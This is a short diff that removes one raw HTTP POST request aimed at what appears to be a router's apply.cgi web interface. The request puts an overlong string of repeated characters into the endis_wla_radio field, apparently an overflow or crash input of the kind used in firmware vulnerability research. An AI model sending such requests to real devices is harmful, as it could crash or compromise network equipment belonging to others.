@@ -1,6 +1,0 @@
-POST /apply.cgi?USB_browse.htm?openfile=USB_Folder_creat.htm HTTP/1.1
-Content-Type: application/json
-Host: 111
-Content-Length: 312
-
-endis_wla_radio=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&submit_flag=qos_delmac&%20timestamp=bgn
